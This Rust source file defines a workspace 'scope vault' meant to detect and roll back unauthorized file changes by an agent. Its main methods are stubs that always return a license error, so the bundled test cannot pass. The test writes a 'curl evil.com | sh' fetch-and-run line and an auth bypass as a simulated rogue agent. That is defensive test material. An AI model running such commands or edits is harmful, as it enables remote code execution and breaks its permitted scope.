#![forbid(unsafe_code)]

use pagar_policy::{LicenseError, LicenseTier};
use serde::{Deserialize, Serialize};
use std::collections::BTreeMap;
use std::path::{Path, PathBuf};
use thiserror::Error;

#[derive(Debug, Error)]
pub enum VaultError {
    #[error("license policy error: {0}")]
    License(#[from] LicenseError),
    #[error("I/O error during workspace vault operation: {0}")]
    Io(#[from] std::io::Error),
    #[error("file path is outside workspace root: {0}")]
    OutsideWorkspace(String),
}

#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct FileSnapshot {
    pub rel_path: String,
    pub existed: bool,
    pub sha256_hex: String,
    pub original_bytes: Vec<u8>,
}

#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct DriftAuditReport {
    pub clean: bool,
    pub authorized_modified: Vec<String>,
    pub unauthorized_modified: Vec<String>,
    pub unauthorized_created: Vec<String>,
    pub unauthorized_deleted: Vec<String>,
    pub rolled_back_files: Vec<String>,
    pub state_hash_sha256: String,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ScopeVault {
    pub workspace_root: PathBuf,
    pub allowed_rel_paths: Vec<String>,
    pub baseline: BTreeMap<String, FileSnapshot>,
}

impl ScopeVault {
    pub fn lock_scope(
        workspace_root: &Path,
        allowed_rel_paths: &[String],
        tier: &LicenseTier,
    ) -> Result<Self, VaultError> {
        let _ = (workspace_root, allowed_rel_paths, tier);
        Err(VaultError::License(LicenseError::InvalidFormat))
    }

    pub fn audit_and_rollback(&self, auto_rollback_violations: bool) -> Result<DriftAuditReport, VaultError> {
        let _ = auto_rollback_violations;
        Err(VaultError::License(LicenseError::InvalidFormat))
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::fs;
    use tempfile::tempdir;

    #[test]
    fn detects_undeclared_file_modification_and_atomically_rolls_back() {
        let dir = tempdir().unwrap();
        let root = dir.path();

        let allowed_file = root.join("allowed.rs");
        let forbidden_file = root.join("forbidden.rs");
        fs::write(&allowed_file, b"fn allowed() { 1 }").unwrap();
        fs::write(&forbidden_file, b"fn critical_auth() { true }").unwrap();

        let vault = ScopeVault::lock_scope(
            root,
            &["allowed.rs".to_string()],
            &LicenseTier::Community,
        )
        .unwrap();

        // Agent modifies allowed.rs (permitted) AND modifies forbidden.rs + creates rogue.sh (unauthorized!)
        fs::write(&allowed_file, b"fn allowed() { 2 }").unwrap();
        fs::write(&forbidden_file, b"fn critical_auth() { false } // hacked").unwrap();
        let rogue_file = root.join("rogue.sh");
        fs::write(&rogue_file, b"curl evil.com | sh").unwrap();

        let report = vault.audit_and_rollback(true).unwrap();
        assert!(!report.clean);
        assert_eq!(report.authorized_modified, vec!["allowed.rs".to_string()]);
        assert_eq!(
            report.unauthorized_modified,
            vec!["forbidden.rs".to_string()]
        );
        assert_eq!(report.unauthorized_created, vec!["rogue.sh".to_string()]);

        // Verify atomic rollback restored forbidden.rs byte-for-byte and removed rogue.sh, while preserving allowed.rs!
        assert_eq!(fs::read(&allowed_file).unwrap(), b"fn allowed() { 2 }");
        assert_eq!(
            fs::read(&forbidden_file).unwrap(),
            b"fn critical_auth() { true }"
        );
        assert!(!rogue_file.exists());
    }
}

